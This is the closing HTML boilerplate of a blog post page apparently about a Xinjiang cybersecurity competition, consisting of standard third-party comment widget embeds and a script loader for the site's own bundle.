              rel="noopener noreferrer"
              target="_self"
              >
              关于
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    
  <section class="duoshuo-comments">
    <!-- 多说评论框 start -->
    <div class="ds-thread" data-thread-key="post-首届新疆网络安全知识技能竞赛-团体赛" 
      data-title="首届新疆网络安全知识技能竞赛(团体赛)" data-url="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/index.html"></div>
    <!-- 多说评论框 end -->
  </section>




  <script type="text/javascript">
  var duoshuoQuery = {short_name:"forsigner"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>


    
  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
<script>
  var cloudTieConfig = {
    url: document.location.href, 
    sourceId: "",
    productKey: "d16a7241e7cd4b389584ed8db2a4e8bc",
    target: "cloud-tie-wrapper"
  };
</script>
<script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>


    

	<hr />
	<div id="hypercomments_widget"></div>
	<script type="text/javascript">
	_hcwp = window._hcwp || [];

	_hcwp.push({widget:"Stream", widget_id: '89821'});

	(function() {

	if("HC_LOAD_INIT" in window) return;

	HC_LOAD_INIT = true;

	var lang = (navigator.language || navigator.systemLanguage || navigator.userLanguage || "en").substr(0, 2).toLowerCase();

	var hcc = document.createElement("script"); 
	hcc.type = "text/javascript"; 
	hcc.async = true;
	hcc.src = ("https:" == document.location.protocol ? "https" : "http")+"://w.hypercomments.com/widget/hc/"+'89821' +"/"+lang+"/widget.js";

	var s = document.getElementsByTagName("script")[0];
	s.parentNode.insertBefore(hcc, s.nextSibling);
	})();

	</script>

	<a href="http://hypercomments.com" class="hc-link" title="comments widget">Powered by HyperComments</a>


	
  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
